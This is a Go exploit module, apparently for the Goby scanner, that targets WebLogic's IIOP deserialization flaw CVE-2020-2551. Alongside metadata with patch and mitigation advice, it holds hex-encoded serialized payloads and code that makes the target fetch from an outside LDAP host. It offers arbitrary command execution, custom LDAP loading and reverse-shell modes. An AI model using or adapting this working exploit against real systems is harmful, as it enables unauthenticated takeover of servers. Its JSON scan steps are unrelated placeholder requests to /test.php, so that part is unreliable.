package exploits

import (
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/jsonvul/protocols"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "WebLogic JtaTransactionManager Remote Code Execution Vulnerability (CVE-2020-2551)",
    "Description": "<p>WebLogic Server is one of the application server components applicable to cloud and traditional environments.</p><p>WebLogic has a remote code execution vulnerability, which allows an unauthenticated attacker to access and destroy the vulnerable WebLogic Server through the IIOP protocol network. A successful exploitation of the vulnerability can cause the WebLogic Server to be taken over by the attacker, resulting in remote code execution.</p>",
    "Product": "Weblogic_interface_7001",
    "Homepage": "https://www.oracle.com/",
    "DisclosureDate": "2020-01-15",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "(body=\"Welcome to WebLogic Server\")||(title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "GobyQuery": "(body=\"Welcome to WebLogic Server\")||(title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "Level": "3",
    "Impact": "<p>WebLogic has a remote code execution vulnerability, which allows an unauthenticated attacker to access and destroy the vulnerable WebLogic Server through the IIOP protocol network. A successful exploitation of the vulnerability can cause the WebLogic Server to be taken over by the attacker, resulting in remote code execution.</p>",
    "Recommendation": "<p>1. At present, the manufacturer has released an upgrade patch to fix the vulnerability. Please install the patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://www.oracle.com/security-alerts/cpujan2020.html\">https://www.oracle.com/security-alerts/cpujan2020.html</a></p><p>2. Temporary mitigation measures: (may affect business, please back up before operating)</p><p>This vulnerability can be mitigated by turning off the IIOP protocol. The operation is as follows: In the Weblogic console, select 'Services' - 'AdminServer' - 'Protocols' and uncheck 'Enable IIOP'. And restart the Weblogic project for the configuration to take effect.</p>",
    "References": [
        "https://www.oracle.com/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackMode",
            "type": "createSelect",
            "value": "cmd,ldap,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackMode=cmd"
        },
        {
            "name": "ldap_addr",
            "type": "input",
            "value": "ldap://xxx.com/exp",
            "show": "attackMode=ldap"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2020-2551"
    ],
    "CNNVD": [
        "CNNVD-202001-675"
    ],
    "CNVD": [
        "CNVD-2020-12879"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Weblogic JtaTransactionManager 反序列化远程代码执行漏洞（CVE-2020-2551）",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。</p><p>WebLogic 存在远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过IIOP协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。</p>",
            "Recommendation": "<p>1、目前厂商已发布升级补丁以修复漏洞，请用户安装补丁以修复漏洞，补丁获取链接：<a href=\"https://www.oracle.com/security-alerts/cpujan2020.html\" target=\"_blank\">https://www.oracle.com/security-alerts/cpujan2020.html</a></p><p>2、临时缓解措施：（可能影响业务，请备份后再操作）</p><p>可通过关闭 IIOP 协议对此漏洞进行缓解。操作如下： 在 Weblogic 控制台中，选择 服务-&gt; AdminServer -&gt; 协议 ，取消 启用 IIOP 的勾选。 并重启 Weblogic 项目，使配置生效。</p>",
            "Impact": "<p>WebLogic 存在远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过IIOP协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "WebLogic JtaTransactionManager Remote Code Execution Vulnerability (CVE-2020-2551)",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server is one of the application server components applicable to cloud and traditional environments.</p><p>WebLogic has a remote code execution vulnerability, which allows an unauthenticated attacker to access and destroy the vulnerable WebLogic Server through the IIOP protocol network. A successful exploitation of the vulnerability can cause the WebLogic Server to be taken over by the attacker, resulting in remote code execution.</p>",
            "Recommendation": "<p>1. At present, the manufacturer has released an upgrade patch to fix the vulnerability. Please install the patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://www.oracle.com/security-alerts/cpujan2020.html\" target=\"_blank\">https://www.oracle.com/security-alerts/cpujan2020.html</a></p><p>2. Temporary mitigation measures: (may affect business, please back up before operating)</p><p>This vulnerability can be mitigated by turning off the IIOP protocol. The operation is as follows: In the Weblogic console, select 'Services' - 'AdminServer' - 'Protocols' and uncheck 'Enable IIOP'. And restart the Weblogic project for the configuration to take effect.</p>",
            "Impact": "<p>WebLogic has a remote code execution vulnerability, which allows an unauthenticated attacker to access and destroy the vulnerable WebLogic Server through the IIOP protocol network. A successful exploitation of the vulnerability can cause the WebLogic Server to be taken over by the attacker, resulting in remote code execution.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10785"
}`

	getVersionFlagFlagd4w6x := func(u *httpclient.FixUrl) (string, error) {
		uri := "/console/login/LoginForm.jsp"
		requestConfig := httpclient.NewGetRequestConfig(uri)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = true
		resp, err := httpclient.DoHttpRequest(u, requestConfig)
		if err != nil {
			return "", err
		}
		// 提取正则
		matches := regexp.MustCompile(`<p id="footerVersion">.+([\d\.]+)</p>`).FindStringSubmatch(resp.Utf8Html)
		if len(matches) > 0 {
			if version := regexp.MustCompile(`[\d\.]+`).FindString(matches[0]); version != "" {
				return version, nil
			}
		}
		return "", errors.New("版本提取失败")
	}

	// 生成
	getPayloadFlagd4w6x := func(ldapUrl string, bindName string, payload string) []byte {
		var bodyEnd string
		bindName = hex.EncodeToString([]byte(bindName))
		bindNameLength := len(bindName) / 2
		bindNameLengthHex := fmt.Sprintf("%x", bindNameLength)
		if bindNameLength < 16 {
			bindNameLengthHex = "0" + bindNameLengthHex
		}
		// band name 长度是三个字节的
		bodyEnd = "00000001000000" + bindNameLengthHex + bindName + payload
		ldapLength := "000000" + strconv.FormatInt(int64(len(ldapUrl)), 16)
		ldapAddr := []byte(ldapUrl)
		hexLdapAddr := hex.EncodeToString(ldapAddr)
		if (len(ldapUrl) % 4) != 0 {
			for n := 0; n < (4 - (len(ldapUrl) % 4)); n++ {
				hexLdapAddr += "00"
			}
		}
		bodyEndBytes, _ := hex.DecodeString(bodyEnd + ldapLength + hexLdapAddr)
		return bodyEndBytes
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			ldapToken := goutils.RandomHexString(4)
			bindName := goutils.RandomHexString(3)
			ldapURL, _ := godclient.GetGodLDAPCheckURL("U", ldapToken)
			// 提取版本号
			version, _ := getVersionFlagFlagd4w6x(u)
			var payloads []string
			if version != "" && strings.HasPrefix(version, "12.2.1.3") || strings.HasPrefix(version, "12.2.1.4") {
				// 12.2.1.3.0、12.2.1.4 序列化 payload 一样，高版本
				payloads = []string{"0000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000074524d493a636f6d2e6265612e636f72652e72657061636b616765642e737072696e676672616d65776f726b2e7472616e73616374696f6e2e6a74612e4a74615472616e73616374696f6e4d616e616765723a413235363030344146343946393942343a3143464133393637334232343037324400ffffffff0001010000000000000001010101000000000000000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000"}
			} else if version != "" && strings.Contains(version, "14.") {
				return false
			} else if version != "" {
				// 低版本
				payloads = []string{"0000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000074524d493a636f6d2e6265612e636f72652e72657061636b616765642e737072696e676672616d65776f726b2e7472616e73616374696f6e2e6a74612e4a74615472616e73616374696f6e4d616e616765723a304433303438453037423144334237423a3445463345434642423632383938324600ffffffff0001010000000000000001010100000000000000000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000"}
			} else {
				// 全版本走一遍
				payloads = append(payloads, "0000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000074524d493a636f6d2e6265612e636f72652e72657061636b616765642e737072696e676672616d65776f726b2e7472616e73616374696f6e2e6a74612e4a74615472616e73616374696f6e4d616e616765723a413235363030344146343946393942343a3143464133393637334232343037324400ffffffff0001010000000000000001010101000000000000000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000")
			}
			if err := protocols.NewIIOP(u.HostInfo, func(iiop *protocols.IIOP) error {
				for _, payload := range payloads {
					if _, err := iiop.Rebind(getPayloadFlagd4w6x(ldapURL, bindName, payload)); err != nil {
						return err
					}
				}
				return nil
			}); err != nil {
				return false
			}
			return godclient.PullExists(ldapToken, 20*time.Second)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackMode := goutils.B2S(stepLogs.Params["attackMode"])
			ldapURL := ""
			var waitSessionCh chan string
			if attackMode == "cmd" {
				// 执行命令
				ldapURL = "ldap://" + godclient.GetGodServerHost() + "/A3"
			} else if attackMode == "ldap" {
				// 执行自定义 LDAP
				ldapURL = goutils.B2S(stepLogs.Params["ldap_addr"])
			} else if attackMode == "reverse" {
				waitSessionCh = make(chan string)
				// 构建反弹Shell LDAP
				if rp, err := godclient.WaitSession("reverse_java", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
					expResult.Output = err.Error()
					return expResult
				} else {
					ldapURL = "ldap://" + godclient.GetGodServerHost() + "/E" + godclient.GetKey() + rp
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			bindName := goutils.RandomHexString(3)
			// 提取版本号
			version, _ := getVersionFlagFlagd4w6x(expResult.HostInfo)
			var payloads []string
			if version != "" && strings.HasPrefix(version, "12.2.1.3") || strings.HasPrefix(version, "12.2.1.4") {
				// 12.2.1.3.0、12.2.1.4 序列化 payload 一样，高版本
				payloads = []string{"0000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000074524d493a636f6d2e6265612e636f72652e72657061636b616765642e737072696e676672616d65776f726b2e7472616e73616374696f6e2e6a74612e4a74615472616e73616374696f6e4d616e616765723a413235363030344146343946393942343a3143464133393637334232343037324400ffffffff0001010000000000000001010101000000000000000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000"}
			} else if version != "" && strings.Contains(version, "14.") {
				expResult.Success = false
				expResult.Output = "漏洞不存在"
				return expResult
			} else if version != "" {
				//  10.3.6、12.1.x、12.2.1.0~2 版本序列化payload一样 低版本
				payloads = []string{"0000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000074524d493a636f6d2e6265612e636f72652e72657061636b616765642e737072696e676672616d65776f726b2e7472616e73616374696f6e2e6a74612e4a74615472616e73616374696f6e4d616e616765723a304433303438453037423144334237423a3445463345434642423632383938324600ffffffff0001010000000000000001010100000000000000000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000"}
			} else {
				// 全版本走一遍
				payloads = append(payloads, "0000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000074524d493a636f6d2e6265612e636f72652e72657061636b616765642e737072696e676672616d65776f726b2e7472616e73616374696f6e2e6a74612e4a74615472616e73616374696f6e4d616e616765723a413235363030344146343946393942343a3143464133393637334232343037324400ffffffff0001010000000000000001010101000000000000000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000")
			}
			if err := protocols.NewIIOP(expResult.HostInfo.HostInfo, func(iiop *protocols.IIOP) error {
				var stub []byte
				if attackMode == "cmd" {
					stub, _ = iiop.StubData("a61b225af2ba8df4e45e373ae0309b7b")
				}
				// 存根读取失败或者执行方式非等于cmd
				if stub == nil || len(stub) == 0 || attackMode != "cmd" {
					for _, payload := range payloads {
						// rebind，反弹时会占用超时
						if _, err := iiop.Rebind(getPayloadFlagd4w6x(ldapURL, bindName, payload)); err != nil && attackMode != "reverse" {
							return err
						}
					}
				}
				if attackMode == "cmd" {
					if len(stub) == 0 || stub == nil {
						if newStub, err := iiop.StubData("a61b225af2ba8df4e45e373ae0309b7b"); err != nil {
							return err
						} else {
							stub = newStub
						}
					}
					if rsp, err := iiop.Exec(stub, goutils.B2S(stepLogs.Params["cmd"])); err != nil {
						return err
					} else {
						expResult.Success = true
						expResult.Output = rsp
						return nil
					}
				} else if attackMode == "ldap" {
					expResult.Success = true
					expResult.Output = "Check LDAP Address : " + ldapURL + " ok!"
					return nil
				} else if attackMode == "reverse" {
					// 执行reverse 检测
					select {
					case webConsoleID := <-waitSessionCh:
						if u, err := url.Parse(webConsoleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
							return nil
						}
					case <-time.After(time.Second * 10):
						return errors.New("反弹失败")
					}
				} else {
					expResult.Success = false
					return errors.New("未知的利用方式")
				}
				return nil
			}); err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			} else {
				return expResult
			}
		}))
}
